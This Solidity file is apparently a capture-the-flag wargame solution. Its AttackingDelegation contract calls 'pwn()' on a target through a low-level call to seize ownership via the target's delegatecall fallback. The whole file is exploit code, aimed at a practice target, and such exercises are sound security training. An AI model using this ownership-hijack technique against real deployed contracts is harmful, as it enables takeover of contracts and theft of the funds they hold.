// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = contractAddress.call(abi.encodeWithSignature("pwn()"));
        require(success, "pwn unsuccessful");
    }
}
